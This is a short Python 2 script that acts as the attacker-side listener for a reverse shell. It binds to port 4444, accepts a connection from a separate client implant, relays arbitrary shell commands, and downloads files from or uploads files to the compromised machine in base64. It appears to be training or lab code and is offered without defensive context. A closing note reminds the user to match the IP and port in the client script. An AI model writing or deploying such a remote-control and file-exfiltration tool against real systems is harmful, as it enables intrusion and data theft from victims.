#!/usr/bin/python

import socket
import json
import base64

def reliable_send(data):
    json_data = json.dumps(data)
    conn.send(json_data)

def reliable_recv():
    json_data = ""
    while True:
        try:
            json_data = json_data + conn.recv(1024)
            return json.loads(json_data)
        except:
            continue


def server():
    global sock
    global conn
    global addr
    global name

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("10.0.2.25", 4444))

    sock.listen(1)
    print("[+]Server is listening for incoming connections")

    conn, addr = sock.accept()
    print("[+]Connection from client: ", addr)


def shell():
    while True:
        command = raw_input("shell#~%s" % str(addr))
        reliable_send(command)

        if command == "-q":
            break

        elif command[:2] == "cd" and len(command) > 1:
            continue

        elif command[:8] == "download":
            try:
                with open(command[9:], "wb") as file:
                    expect = reliable_recv()
                    file.write(base64.b64decode(expect))
                res = reliable_recv()
                print(res)
            except:
                continue

        elif command[:6] == "upload":
            try:
                with open(command[7:], "rb") as file:
                    reliable_send(base64.b64encode(file.read()))
                    ret = reliable_recv()
                    print(ret)
            except:
                continue

        else:
            try:
                response = reliable_recv()
                print(response)
            except:
                continue

server()
shell()

sock.close()

"""NOTES:
-Do not forget to change the IP and the PORT on the CLIENT script
-For uploading files to a remote host you will need to locate the file to the same directory as the server, if not it 
will say you have an error"""